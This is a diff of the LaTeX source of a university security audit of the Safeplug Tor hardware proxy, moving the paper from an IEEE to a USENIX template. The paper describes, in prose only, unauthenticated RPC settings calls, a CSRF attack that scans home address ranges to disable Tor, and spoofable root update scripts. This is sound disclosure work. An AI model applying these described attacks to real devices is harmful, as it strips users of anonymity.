-% compilation based on whether the output is pdf or dvi.
-% usage:
-% \ifpdf
-%   % pdf code
-% \else
-%   % dvi code
-% \fi
-% The latest version of ifpdf.sty can be obtained from:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/oberdiek/
-% Also, note that IEEEtran.cls V1.7 and later provides a builtin
-% \ifCLASSINFOpdf conditional that works the same way.
-% When switching from latex to pdflatex and vice-versa, the compiler may
-% have to be run twice to clear warning/error messages.
+% Note that since 2010, USENIX does not require endnotes. If you want
+% foot of page notes, don't include the endnotes package in the 
+% usepackage command, below.
 
-% *** CITATION PACKAGES ***
-%
-\usepackage{cite}
-% cite.sty was written by Donald Arseneau
-% V1.6 and later of IEEEtran pre-defines the format of the cite.sty package
-% \cite{} output to follow that of IEEE. Loading the cite package will
-% result in citation numbers being automatically sorted and properly
-% "compressed/ranged". e.g., [1], [9], [2], [7], [5], [6] without using
-% cite.sty will become [1], [2], [5]--[7], [9] using cite.sty. cite.sty's
-% \cite will automatically add leading space, if needed. Use cite.sty's
-% noadjust option (cite.sty V3.8 and later) if you want to turn this off.
-% cite.sty is already installed on most LaTeX systems. Be sure and use
-% version 4.0 (2003-05-27) and later if using hyperref.sty. cite.sty does
-% not currently provide for hyperlinked citations.
-% The latest version can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/cite/
-% The documentation is contained in the cite.sty file itself.
+% This version uses the latex2e styles, not the very ancient 2.09 stuff.
+\newcommand{\cks}[1]{\emph{cks: #1}}
+\newcommand{\comment}[1]{}
 
-% *** GRAPHICS RELATED PACKAGES ***
-%
-\ifCLASSINFOpdf
-   \usepackage[pdftex]{graphicx}
-  % declare the path(s) where your graphic files are
-  % \graphicspath{{../pdf/}{../jpeg/}}
-  % and their extensions so you won't have to specify these with
-  % every instance of \includegraphics
-  % \DeclareGraphicsExtensions{.pdf,.jpeg,.png}
-\else
-  % or other class option (dvipsone, dvipdf, if not using dvips). graphicx
-  % will default to the driver specified in the system graphics.cfg if no
-  % driver is specified.
-  % \usepackage[dvips]{graphicx}
-  % declare the path(s) where your graphic files are
-  % \graphicspath{{../eps/}}
-  % and their extensions so you won't have to specify these with
-  % every instance of \includegraphics
-  % \DeclareGraphicsExtensions{.eps}
-\fi
-% graphicx was written by David Carlisle and Sebastian Rahtz. It is
-% required if you want graphics, photos, etc. graphicx.sty is already
-% installed on most LaTeX systems. The latest version and documentation can
-% be obtained at: 
-% http://www.ctan.org/tex-archive/macros/latex/required/graphics/
-% Another good source of documentation is "Using Imported Graphics in
-% LaTeX2e" by Keith Reckdahl which can be found as epslatex.ps or
-% epslatex.pdf at: http://www.ctan.org/tex-archive/info/
-%
-% latex, and pdflatex in dvi mode, support graphics in encapsulated
-% postscript (.eps) format. pdflatex in pdf mode supports graphics
-% in .pdf, .jpeg, .png and .mps (metapost) formats. Users should ensure
-% that all non-photo figures use a vector format (.eps, .pdf, .mps) and
-% not a bitmapped formats (.jpeg, .png). IEEE frowns on bitmapped formats
-% which can result in "jaggedy"/blurry rendering of lines and letters as
-% well as large increases in file sizes.
-%
-% You can find documentation about the pdfTeX application at:
-% http://www.tug.org/applications/pdftex
-
-% *** MATH PACKAGES ***
-%
-%\usepackage[cmex10]{amsmath}
-% A popular package from the American Mathematical Society that provides
-% many useful and powerful commands for dealing with mathematics. If using
-% it, be sure to load this package with the cmex10 option to ensure that
-% only type 1 fonts will utilized at all point sizes. Without this option,
-% it is possible that some math symbols, particularly those within
-% footnotes, will be rendered in bitmap form which will result in a
-% document that can not be IEEE Xplore compliant!
-%
-% Also, note that the amsmath package sets \interdisplaylinepenalty to 10000
-% thus preventing page breaks from occurring within multiline equations. Use:
-%\interdisplaylinepenalty=2500
-% after loading amsmath to restore such page breaks as IEEEtran.cls normally
-% does. amsmath.sty is already installed on most LaTeX systems. The latest
-% version and documentation can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/required/amslatex/math/
-
-% *** SPECIALIZED LIST PACKAGES ***
-%
-%\usepackage{algorithmic}
-% algorithmic.sty was written by Peter Williams and Rogerio Brito.
-% This package provides an algorithmic environment fo describing algorithms.
-% You can use the algorithmic environment in-text or within a figure
-% environment to provide for a floating algorithm. Do NOT use the algorithm
-% floating environment provided by algorithm.sty (by the same authors) or
-% algorithm2e.sty (by Christophe Fiorio) as IEEE does not use dedicated
-% algorithm float types and packages that provide these will not provide
-% correct IEEE style captions. The latest version and documentation of
-% algorithmic.sty can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/algorithms/
-% There is also a support site at:
-% http://algorithms.berlios.de/index.html
-% Also of interest may be the (relatively newer and more customizable)
-% algorithmicx.sty package by Szasz Janos:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/algorithmicx/
-
-% *** ALIGNMENT PACKAGES ***
-%
-%\usepackage{array}
-% Frank Mittelbach's and David Carlisle's array.sty patches and improves
-% the standard LaTeX2e array and tabular environments to provide better
-% appearance and additional user controls. As the default LaTeX2e table
-% generation code is lacking to the point of almost being broken with
-% respect to the quality of the end results, all users are strongly
-% advised to use an enhanced (at the very least that provided by array.sty)
-% set of table tools. array.sty is already installed on most systems. The
-% latest version and documentation can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/required/tools/
-
-%\usepackage{mdwmath}
-%\usepackage{mdwtab}
-% Also highly recommended is Mark Wooding's extremely powerful MDW tools,
-% especially mdwmath.sty and mdwtab.sty which are used to format equations
-% and tables, respectively. The MDWtools set is already installed on most
-% LaTeX systems. The lastest version and documentation is available at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/mdwtools/
-
-% IEEEtran contains the IEEEeqnarray family of commands that can be used to
-% generate multiline equations as well as matrices, tables, etc., of high
-% quality.
-
-%\usepackage{eqparbox}
-% Also of notable interest is Scott Pakin's eqparbox package for creating
-% (automatically sized) equal width boxes - aka "natural width parboxes".
-% Available at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/eqparbox/
-
-% *** SUBFIGURE PACKAGES ***
-%\usepackage[tight,footnotesize,caption=false]{subfig}
-\usepackage[caption=false]{subfig}
-%\usepackage[center]{caption}
-% subfigure.sty was written by Steven Douglas Cochran. This package makes it
-% easy to put subfigures in your figures. e.g., "Figure 1a and 1b". For IEEE
-% work, it is a good idea to load it with the tight package option to reduce
-% the amount of white space around the subfigures. subfigure.sty is already
-% installed on most LaTeX systems. The latest version and documentation can
-% be obtained at:
-% http://www.ctan.org/tex-archive/obsolete/macros/latex/contrib/subfigure/
-% subfigure.sty has been superceeded by subfig.sty.
-% subfig.sty, also written by Steven Douglas Cochran, is the modern
-% replacement for subfigure.sty. However, subfig.sty requires and
-% automatically loads Axel Sommerfeldt's caption.sty which will override
-% IEEEtran.cls handling of captions and this will result in nonIEEE style
-% figure/table captions. To prevent this problem, be sure and preload
-% caption.sty with its "caption=false" package option. This is will preserve
-% IEEEtran.cls handing of captions. Version 1.3 (2005/06/28) and later 
-% (recommended due to many improvements over 1.2) of subfig.sty supports
-% the caption=false option directly:
-%\usepackage[caption=false,font=footnotesize]{subfig}
-%
-% The latest version and documentation can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/subfig/
-% The latest version and documentation of caption.sty can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/caption/
-
-% *** FLOAT PACKAGES ***
-%
-\usepackage{fixltx2e}
-% fixltx2e, the successor to the earlier fix2col.sty, was written by
-% Frank Mittelbach and David Carlisle. This package corrects a few problems
-% in the LaTeX2e kernel, the most notable of which is that in current
-% LaTeX2e releases, the ordering of single and double column floats is not
-% guaranteed to be preserved. Thus, an unpatched LaTeX2e can allow a
-% single column figure to be placed prior to an earlier double column
-% figure. The latest version and documentation can be found at:
-% http://www.ctan.org/tex-archive/macros/latex/base/
-
-\usepackage{stfloats}
-% stfloats.sty was written by Sigitas Tolusis. This package gives LaTeX2e
-% the ability to do double column floats at the bottom of the page as well
-% as the top. (e.g., "\begin{figure*}[!b]" is not normally possible in
-% LaTeX2e). It also provides a command:
-%\fnbelowfloat
-% to enable the placement of footnotes below bottom floats (the standard
-% LaTeX2e kernel puts them above bottom floats). This is an invasive package
-% which rewrites many portions of the LaTeX2e float routines. It may not work
-% with other packages that modify the LaTeX2e float routines. The latest
-% version and documentation can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/sttools/
-% Documentation is contained in the stfloats.sty comments as well as in the
-% presfull.pdf file. Do not use the stfloats baselinefloat ability as IEEE
-% does not allow \baselineskip to stretch. Authors submitting work to the
-% IEEE should note that IEEE rarely uses double column equations and
-% that authors should try to avoid such use. Do not be tempted to use the
-% cuted.sty or midfloat.sty packages (also by Sigitas Tolusis) as IEEE does
-% not format its papers in such ways.
-
-% *** PDF, URL AND HYPERLINK PACKAGES ***
-%
+\documentclass[letterpaper,twocolumn,10pt]{article}
+\usepackage{graphicx}
+\usepackage{usenix,epsfig}
 \usepackage{url}
-% url.sty was written by Donald Arseneau. It provides better support for
-% handling and breaking URLs. url.sty is already installed on most LaTeX
-% systems. The latest version can be obtained at:
-% http://www.ctan.org/tex-archive/macros/latex/contrib/misc/
-% Read the url.sty source comments for usage information. Basically,
-% \url{my_url_here}.
-
 \usepackage{listings}
-
-% correct bad hyphenation here
-\hyphenation{op-tical net-works semi-conduc-tor}
-
-% THIS ALLOWS THE THANKS FOOTNOTE
-\IEEEoverridecommandlockouts
-
-\pagestyle{plain}
 
@@
 
-\lstset{basicstyle=\footnotesize}
+%don't want date printed
+\date{}
 
-%
-% paper title
-% can use linebreaks \\ within to get better formatting as desired
-\title{Security Audit of Safeplug ``Tor in a Box''}
+\title{\Large \bf Security Audit of Safeplug ``Tor in a Box''}
+%\author{
+% {\rm Anne Edmundson}\\
+% Princeton University
+% \and
+% {\rm Anna Kornfeld Simpson}\\
+% Princeton University
+% \and
+% {\rm Joshua Kroll}\\
+% Princeton University
+% \and
+% {\rm Edward Felten}\\
+% Princeton University
+%} % end author
 
-% author names and affiliations
-% use a multiple column layout for up to three different
-% affiliations
-%\author{\IEEEauthorblockN{Anne Edmundson}
-%\IEEEauthorblockA{Department of Computer Science\\
-%Princeton University\\
-%Princeton, New Jersey 08540-5233\\
-%Email: annee@cs.princeton.edu}
-%\and
-%\IEEEauthorblockN{Anna Kornfeld Simpson}
-%\IEEEauthorblockA{Department of Computer Science\\
-%Princeton University\\
-%Princeton, New Jersey 08540-5233\\
-%Email: aksimpso@cs.princeton.edu}
-%\and
-%\IEEEauthorblockN{Josh Kroll}
-%\IEEEauthorblockA{Department of Computer Science\\
-%Princeton University\\
-%Princeton, New Jersey 08540-5233\\
-%Email: kroll@cs.princeton.edu}
-%\and
-%\IEEEauthorblockN{Ed Felten}
-%\IEEEauthorblockA{Department of Computer Science\\
-%Princeton University\\
-%Princeton, New Jersey 08540-5233\\
-%Email: felten@cs.princeton.edu}}
-
-% conference papers do not typically use \thanks and this command
-% is locked out in conference mode. If really needed, such as for
-% the acknowledgment of grants, issue a \IEEEoverridecommandlockouts
-% after \documentclass
-
-% for over three affiliations, or if they all won't fit within the width
-% of the page, use this alternative format:
-% 
-\author{\IEEEauthorblockN{Anna Kornfeld Simpson*,
-Anne Edmundson*,
-Joshua A. Kroll, and
-Edward W. Felten}
-\IEEEauthorblockA{Department of Computer Science\\
-Princeton University,
-Princeton, NJ 08540}
-\thanks{*Both authors contributed equally to this work.}}
-
-% use for special paper notices
-%\IEEEspecialpapernotice{(Invited Paper)}
-
-% make the title area
 \maketitle
 
-\begin{abstract}
-%\boldmath
+\thispagestyle{empty}
+
+\subsection*{Abstract}
 We present the first public third-party security audit of Pogoplug's Safeplug device, which markets ``complete security and anonymity online'' by using Tor technology to protect users' IP addresses.
@@
 Beyond this problem, the user experience challenges of this type of device make it inferior to the existing gold standard for anonymous browsing: the Tor Browser Bundle.
-\end{abstract}
-% IEEEtran.cls defaults to using nonbold math in the Abstract.
-% This preserves the distinction between vectors and scalars. However,
-% if the conference you are submitting to favors bold math in the abstract,
-% then you can use LaTeX's standard command \boldmath at the very start
-% of the abstract to achieve this. Many IEEE journals/conferences frown on
-% math in the abstract anyway.
 
-% no keywords
-
-% For peer review papers, you can put extra information on the cover
-% page as needed:
-% \ifCLASSOPTIONpeerreview
-% \begin{center} \bfseries EDICS Category: 3-BBND \end{center}
-% \fi
-%
-% For peerreview papers, this IEEEtran command inserts a page break and
-% creates the second title. It will be ignored for other modes.
-\IEEEpeerreviewmaketitle
-
-% An example of a floating figure using the graphicx package.
-% Note that \label must occur AFTER (or within) \caption.
-% For figures, \caption should occur after the \includegraphics.
-% Note that IEEEtran v1.7 and later has special internal code that
-% is designed to preserve the operation of \label within \caption
-% even when the captionsoff option is in effect. However, because
-% of issues like this, it may be the safest practice to put all your
-% \label just after \caption rather than within \caption{}.
-%
-% Reminder: the "draftcls" or "draftclsnofoot", not "draft", class
-% option should be used if it is desired that the figures are to be
-% displayed while in draft mode.
-%
-%\begin{figure}[!t]
-%\centering
-%\includegraphics[width=2.5in]{myfigure}
-% where an .eps filename suffix will be assumed under latex, 
-% and a .pdf suffix will be assumed for pdflatex; or what has been declared
-% via \DeclareGraphicsExtensions.
-%\caption{Simulation Results}
-%\label{fig_sim}
-%\end{figure}
-
-% Note that IEEE typically puts floats only at the top, even when this
-% results in a large percentage of a column being occupied by floats.
-
-% An example of a double column floating figure using two subfigures.
-% (The subfig.sty package must be loaded for this to work.)
-% The subfigure \label commands are set within each subfloat command, the
-% \label for the overall figure must come after \caption.
-% \hfil must be used as a separator to get equal spacing.
-%
-%\begin{figure*}[!t]
-%\centerline{\subfloat[Case I]\includegraphics[width=2.5in]{subfigcase1}%
-%\label{fig_first_case}}
-%\hfil
-%\subfloat[Case II]{\includegraphics[width=2.5in]{subfigcase2}%
-%\label{fig_second_case}}}
-%\caption{Simulation results}
-%\label{fig_sim}
-%\end{figure*}
-%
-% Note that often IEEE papers with subfigures do not employ subfigure
-% captions (using the optional argument to \subfloat), but instead will
-% reference/describe all of them (a), (b), etc., within the main caption.
-
-% An example of a floating table. Note that, for IEEE style tables, the 
-% \caption command should come BEFORE the table. Table text will default to
-% \footnotesize as IEEE normally uses this smaller font for tables.
-% The \label must come after \caption as always.
-%
-%\begin{table}[!t]
-%% increase table row spacing, adjust to taste
-%\renewcommand{\arraystretch}{1.3}
-% if using array.sty, it might be a good idea to tweak the value of
-% \extrarowheight as needed to properly center the text within the cells
-%\caption{An Example of a Table}
-%\label{table_example}
-%\centering
-%% Some packages, such as MDW tools, offer better commands for making tables
-%% than the plain LaTeX2e tabular which is used here.
-%\begin{tabular}{|c||c|}
-%\hline
-%One & Two\\
-%\hline
-%Three & Four\\
-%\hline
-%\end{tabular}
-%\end{table}
+\setlength{\parskip}{1ex plus 2ex minus 2ex}
 
 \section{Introduction}
-% no \IEEEPARstart
-
 Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data; anonymity has become the goal for many Internet users in order to protect themselves.
@@
 
-\begin{figure*}
+\begin{figure}
 \centering
-\includegraphics[width=.65\textwidth]{instructions2}
+\includegraphics[width=.45\textwidth]{instructions2}
 \caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
@@
 \label{fig:instructions}
-\end{figure*}
+\end{figure}
 
-\begin{figure*}
-\centering
-\includegraphics[width=.4\textwidth]{safeplug_flowchart}
-\caption{Flowchart demonstrating the actual functionality of the Safeplug as an HTTP proxy between a device's browser and the home network's router.}
-\label{fig:flow}
-\end{figure*}
+%\begin{figure*}
+%\centering
+%\includegraphics[width=.4\textwidth]{safeplug_flowchart}
+%\caption{Flowchart demonstrating the actual functionality of the Safeplug as an HTTP proxy between a device's browser and the home network's router.}
+%\label{fig:flow}
+%\end{figure*}
 
 \section{Background}
-{\bf Tor.} The state-of-the-art in online anonymity technology is Tor.
-Tor is a service that provides anonymous communication via an onion router; by encrypting internet traffic and sending it through layers of relays, a user can make it much more difficult to trace their internet use~\cite{tor}.
-Instead of appearing to come from a user's IP address, the traffic will reach the destination from one of the relays, that will have received the traffic from another relay, creating a chain back from when the user first sent their traffic to a relay.
-Tor is known as an onion router because each relay peels back one layer of encryption and no more, allowing it to send the traffic to the next destination but not allowing it to discover the origin or final recipient of the traffic.
-Tor is open-source software developed by the Tor Project~\cite{torproject}.
-Users of Tor are highly recommended to access the Tor network via the Tor Browser Bundle, which provides a browser and the Tor software package in a single installation.
-This browser comes configured to prevent deanonymization of web traffic by means that the Tor network does not protect against, such as cookies, supercookies, or scripts~\cite{torproject}.
-
-Using Tor or the Tor Browser Bundle provides a tradeoff between anonymity, usability, and efficiency.
-Sending traffic to these relays around the world significantly increases its latency, possibly degrading user experience for websites that load a lot of data in real-time.
-In addition, because the destination website will see the user's request from a new, likely international IP address, websites such as banks or news sites that have location-based content may deny users access to their sites or the information that they seek.
-For many users around the world, these troubles are a worthwhile price for access to free and open Internet, anonymous communications, and resisting censorship.
-However, one of the biggest reasons that Tor is not more widely used is that many Internet users do not know about Tor, how it works, or how to use it to become more anonymous online.
-
 {\bf Safeplug.} Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
@@
 The Marvell controller is from 2008 and is an ARM SoC~\cite{marvellhw}.
-This is the same controller as version 4 of Pogoplug's cloud storage device; teardowns of that device that are available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
-It is also interesting to note that the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
-
-\begin{figure*}[tb]
-\centering
-\subfloat[][Top of the board inside the Safeplug device.]{
-  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
-  \label{fig:top}
-}
-\qquad
-\subfloat[][Bottom of the Board inside the Safeplug device.]{
-  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
-  \label{fig:bottom}
-}
-\caption{Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
-\label{fig:circuit}
-\end{figure*}
+%\begin{figure*}[tb]
+%\centering
+%\subfloat[][Top of the board inside the Safeplug device.]{
+%  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
+%  \label{fig:top}
+%}
+%\qquad
+%\subfloat[][Bottom of the Board inside the Safeplug device.]{
+%  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
+%  \label{fig:bottom}
+%}
+%\caption{Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
+%\label{fig:circuit}
+%\end{figure*}
 
@@
 
-\begin{figure*}
-\centering
-\includegraphics[width=.55\textwidth]{new_callgraph}
-\caption{The call graph for modifying the Safeplug settings page.}
-\label{fig:callgraph}
-\end{figure*}
+%\begin{figure*}
+%\centering
+%\includegraphics[width=.55\textwidth]{new_callgraph}
+%\caption{The call graph for modifying the Safeplug settings page.}
+%\label{fig:callgraph}
+%\end{figure*}
 
@@
 Before the activation of the Safeplug, only ports 80 (HTTP) and 3333 (unknown purpose) are open.
-After the activation, without the use of Tor turned on, port 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
+After the activation, port 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
 When Tor is turned on as a relay, port 9001 is opened as well.
@@
 First, the TOS are never presented to the user: they aren't presented in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
-Although use of the Safeplug device purportedly constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
-However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language for TOS but not a good combination with them never being presented to the user.
 
-Following good security and development practices, the Safeplug makes use of several pieces of open source software.
+The Safeplug makes uses several pieces of open source software.
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
@@
 However, there is no way to find this page from the Terms of Service or the Safeplug website.
-
-The final area of interest was software updates on the device which will be ``automatically delivered'' to the user, but it is unclear whether there will be any notification~\cite{safeplug}.
-Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof}).
-This is one of the many reasons why users who truly need security and anonymity should opt for the Tor Browser Bundle rather than adding the Safeplug to their network.
 
@@
 
-\begin{table*}[!t]
+\begin{table}[!t]
 \renewcommand{\arraystretch}{1.3}
@@
 	\end{tabular}
-\end{table*}
-
-%\begin{center}
-%	\begin{tabular}{|c|c|}
-%	\hline
-%		Platform & Browsers \\ \hline
-%		Windows	& Internet Explorer, Chrome, Firefox \\ \hline
-%		OSX & Safari, Chrome, Firefox \\ \hline
-%		iOS	& Safari \\ \hline
-%		Android	& Chrome \\ \hline
-%	\end{tabular}
-%\end{center}
+\end{table}
 
@@
 
-The link provided is to an advertisement-filled and not particularly reputable-looking website with no clear navigation to get to the necessary instructions.
-Without clear guidance, many users will leave the setting in its default, non-relay state, which would cause a there would be a large increase in load on the Tor network, without a comparable increase in its ability to support more load.
-The technical barrier could be easily overcome; Safeplug should choose a target audience and have consistent descriptions.
-The best option is to explain the Tor network and the functionality of a Tor relay node at the same accessible level.
-This increases the chances that users will run their Safeplug as a relay node.
+The link provided is to an advertisement-filled and confusing website.
 
-Another consequence of misunderstanding the use of the Safeplug as a relay node, or more specifically, as an exit node is the possible legal repercussions.
+Using Safeplug as an exit node has possible legal repercussions.
 As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illicit activities.
 The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
-For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any contextual information.
+For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay without providing the user with any contextual information.
 
@@
 
-\begin{figure*}[tb]
-\centering
-\subfloat[][Web page before using Tor and ad-blocking.]{
-  \includegraphics[width=.3\textwidth]{before}
-  \label{fig:before}
-}
-\quad
-\subfloat[][Web page after using Tor and ad-blocking.]{
-  \includegraphics[width=.3\textwidth]{after}
-  \label{fig:after}
-}
-\caption{Application of Safeplug proxy settings.}
-\end{figure*}
-
-Figure~\ref{fig:before} shows a web page before using Tor or ad-blocking, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
-Both of these figures show the IP address in the top right corner; we can see that the traffic is being routed through Tor due to the change in IP address.
+%\begin{figure*}[tb]
+%\centering
+%\subfloat[][Web page before using Tor and ad-blocking.]{
+%  \includegraphics[width=.3\textwidth]{before}
+%  \label{fig:before}
+%}
+%\quad
+%\subfloat[][Web page after using Tor and ad-blocking.]{
+%  \includegraphics[width=.3\textwidth]{after}
+%  \label{fig:after}
+%}
+%\caption{Application of Safeplug proxy settings.}
+%\end{figure*}
 
@@
 While browsing the Internet in a fresh browser session, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
-When we clicked on the Google+ widget, it remember who we are; so we can confirm that a cookie associated with the login was sent to the second Google+ page.
+When we clicked on the Google+ widget, it knew who we were; so we can confirm that a cookie associated with the login was sent to the second Google+ page.
 We experienced the same situation with Facebook and its corresponding ``like'' button.
@@
 
-\begin{figure*}
+\begin{figure}
   \centering
@@
   \label{fig:latency2}
-\end{figure*}
-
-The average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
-This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad (which it requested through Tor); \url{www.google.com} does not have any ads.
-
-The latency of using the Safeplug with Firefox, Tor, and ad-blocking is comparable to that of using the Tor Browser Bundle.
-For all three web pages, the Tor Browser Bundle had slightly lower latency; the Tor Browser Bundle blocks scripts, and for web pages such as \url{www.coca-cola.com}, this provides a significant latency decrease.
-This, in conjunction with the fact that the Tor Browser Bundle is free and is issued directly from The Tor Project, shows a convincing argument to use the Tor Browser Bundle in place of the Safeplug.
+\end{figure}
 
@@
 \subsection{Insider Attack}
-The Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network can easily modify the settings.
-Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone inside the network can perform this attack.
-Unlike many home routers, there is no username/password combination necessary to access this page.
+The Safeplug has no validation or authentication on the settings page for these RPC calls, so any malicious party inside the home network can easily modify the settings.
+Unlike many home routers, there is no username/password combination necessary to access the settings page.
 A more technically advanced user could send the call directly to the RPC server.
-All the attacker would need to know is the IP address of the device.
 Figure \ref{disable} shows an example of the RPC version of this attack.
@@
 For example, if the user has an open WiFi network, then anyone nearby can launch this attack - potentially peforming a sort of drive-by deanonymization.
-Similarly, the Safeplug would be utterly ineffective at securing traffic from a public network such as a hotel or cafe because every logged in user on that network could change the settings.
 
 Since the RPC version of the attack just involves basic Internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
-The NSA ``Spymall'' catalog \cite{spymall} leaked in December shows tools for compromising a number of different devices and home routers are particularly insecure.
-It is easy to imagine any malicious party, not just one with the resources of a government (although governments might be some of the most interested parties in attacking a Tor proxy), compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
-This would occur silently from the perspective of a client unless they happen to check the settings page for the Safeplug.
-Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
-This is a critical vulnerability and requires action from Pogoplug to fix.
 
@@
 Any external website can also perform the above attack by returning a correctly formatted POST string via an internal user's browser.
-This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
+This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network.
 This Cross Site Request Forgery (CSRF) attack requires a nonmalicious insider user to visit a web page controlled by the attacker, allowing the attacker to send the POST to the Safeplug by performing an exhaustive search on the address space.
@@
 
-This exploits the RPC server in the same manner that the Insider Attack does.
 While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.
@@
 For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the Safeplug and stop the search.
-However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second, a trivial amount of time for the attacker to spend.
+However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second.
 
@@
 \label{dnsspoof}
-An additional dangerous class of vulnerabilities comes from the the use of insecure TCP rather than any kind of encrypted communication during the update process.
-During our network analysis of the activation process, we discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
+An additional dangerous class of vulnerabilities comes from the the use of insecure TCP rather than any kind of encrypted communication during the software update process.
+We discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
 This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is verification of the update script itself.
 An adversary could use DNS spoofing or compromise the Pogoplug server and force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
-The most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in; therefore, any kind of detection or mitigation would be beyond an average user.
 Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
@@
 
-{\bf Cookies} There has been much policy and technology debate around the topic of third-party web tracking.
-Mayer and Mitchell survey recent policy and technology stances on web tracking; while tracking allows for free web content and innovation, it compromises a user's privacy~\cite{commercial2}.
-They discuss the existence and use of stateful tracking by using ``supercookies.''  While many companies use cookies, there has also been work in developing privacy-preserving third-party services, such as Privad, Adnostic, and RePriv~\cite{guha, toubiana, fredrikson}.
-
 \section{Discussion}
-\subsection{Engineering Fixes}
+\subsection{Necessary Fixes}
 The most critical engineering fix is authentication in the POST calls to prevent the CSRF attack.
@@
 For example, cookies and fingerprinting problems mean that users could still be tracked across websites, regardless of whether the ad-block functionality on the Safeplug is enabled.
-This poses an unreasonable stress on users who must be aware of their browsing practices and does not bode well for the advertised security and anonymity.
 
-One type of client that deserves special attention is a non-Android mobile phone user.
-Although the Tor Project publishes an Android app called Orbot on the Android Market, which is supported for Android versions 2.3 and later, there are no official Tor apps for iPhones or other non-Android devices~\cite{orbot,amorbot}.
+One type of client that deserves special attention is a mobile phone user.
 Safeplug provides proxy functionality and instructions for Safari on the iPhone and Chrome on Android.
 However, while this does supposedly give the option for more mobile users to make use of Tor, proxy configuation on mobile devices comes with significant usability issues.
-For example, the proxying would only work while the user is on that wifi network that the Safeplug routes through.
+For example, proxying would only work while the user is on the same wifi network as the Safeplug.
 If any data is sent over the cellular network or another wifi network, then the security of Tor is lost.
@@
 Despite all the structural problems, is there a market for a Torifying piece of hardware?
-Given the security pitfalls in comparison to a piece of software such as the Tor Browser Bundle, there seems to be no reason for a user that can run the Tor Browser Bundle to purchase the Safeplug or any other device.
+Given the security pitfalls in comparison to a piece of software such as the Tor Browser Bundle, there seems to be no reason for a user who can run the Tor Browser Bundle to purchase the Safeplug or any other device.
 For mobile phones, the proxy problems with mobility contribute to an already high usability cost.
@@
 Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is problematic as a method for security and anonymity online.
